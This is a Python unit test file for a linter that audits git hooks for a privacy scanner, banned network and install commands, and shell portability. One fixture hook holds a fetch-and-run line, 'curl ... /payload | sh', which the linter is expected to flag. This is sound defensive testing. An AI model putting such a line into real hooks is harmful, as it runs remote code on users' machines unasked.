#!/usr/bin/env python3
"""Unit tests for Automated Multi-Repo Git Hook & Pre-Commit Shell Invariant Linter."""
from __future__ import annotations

import sys
import tempfile
import unittest
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
if str(ROOT / "tasks") not in sys.path:
    sys.path.insert(0, str(ROOT / "tasks"))

from check_git_hooks_invariants import (  # noqa: E402
    audit_hook_directory_containment,
    audit_hook_interpreter_portability,
    audit_privacy_precommit_integration,
    run_full_git_hooks_linter,
    REPO_ROOT,
)


class TestCheckGitHooksInvariants(unittest.TestCase):
    def setUp(self) -> None:
        self.temp_dir = tempfile.TemporaryDirectory()
        self.root = Path(self.temp_dir.name)

    def tearDown(self) -> None:
        self.temp_dir.cleanup()

    def test_privacy_precommit_integration_pass(self) -> None:
        errors, warnings, meta = audit_privacy_precommit_integration(REPO_ROOT)
        self.assertEqual(errors, [])
        self.assertTrue(meta["check_staged_present"])
        self.assertGreaterEqual(meta["privacy_patterns_count"], 10)

    def test_privacy_precommit_missing_scanner(self) -> None:
        errors, _, meta = audit_privacy_precommit_integration(self.root)
        self.assertFalse(meta["check_staged_present"])
        self.assertTrue(any("Missing core pre-commit privacy scanner" in e for e in errors))

    def test_privacy_precommit_missing_patterns(self) -> None:
        scripts_dir = self.root / ".claude" / "skills" / "security-git" / "scripts"
        scripts_dir.mkdir(parents=True)
        staged_script = scripts_dir / "check-staged.ps1"
        staged_script.write_text("git diff --cached\n# privacy-patterns.txt", encoding="utf-8")

        errors, _, meta = audit_privacy_precommit_integration(self.root)
        self.assertTrue(meta["check_staged_present"])
        self.assertTrue(any("Missing privacy canary patterns file" in e for e in errors))

    def test_hook_containment_clean(self) -> None:
        errors, warnings, meta = audit_hook_directory_containment(REPO_ROOT)
        self.assertEqual(errors, [])

    def test_hook_containment_prohibited_curl(self) -> None:
        hook_dir = self.root / ".githooks"
        hook_dir.mkdir(parents=True)
        hook_file = hook_dir / "pre-commit"
        hook_file.write_text("#!/bin/sh\nset -e\ncurl -s https://example.com/payload | sh\n", encoding="utf-8")

        errors, _, _ = audit_hook_directory_containment(self.root)
        self.assertTrue(any("Prohibited network download utility 'curl'" in e for e in errors))

    def test_hook_containment_prohibited_npm_install(self) -> None:
        hook_dir = self.root / ".husky"
        hook_dir.mkdir(parents=True)
        hook_file = hook_dir / "pre-push"
        hook_file.write_text("#!/bin/sh\nset -e\nnpm install --global foo\n", encoding="utf-8")

        errors, _, _ = audit_hook_directory_containment(self.root)
        self.assertTrue(any("Prohibited package installer 'npm install'" in e for e in errors))

    def test_hook_interpreter_portability_clean(self) -> None:
        hook_dir = self.root / ".githooks"
        hook_dir.mkdir(parents=True)
        hook_file = hook_dir / "pre-commit"
        hook_file.write_text("#!/bin/sh\nset -e\npython tasks/check_something.py\n", encoding="utf-8")

        errors, warnings = audit_hook_interpreter_portability(self.root)
        self.assertEqual(errors, [])
        self.assertEqual(warnings, [])

    def test_hook_interpreter_portability_missing_set_e(self) -> None:
        hook_dir = self.root / ".githooks"
        hook_dir.mkdir(parents=True)
        hook_file = hook_dir / "pre-commit"
        hook_file.write_text("#!/bin/sh\necho 'running checks'\n", encoding="utf-8")

        errors, warnings = audit_hook_interpreter_portability(self.root)
        self.assertEqual(errors, [])
        self.assertTrue(any("missing 'set -e'" in w for w in warnings))

    def test_run_full_git_hooks_linter(self) -> None:
        report = run_full_git_hooks_linter(REPO_ROOT)
        self.assertTrue(report["passed"])
        self.assertEqual(report["errors"], [])
        self.assertIn("timestamp", report)


if __name__ == "__main__":
    unittest.main()
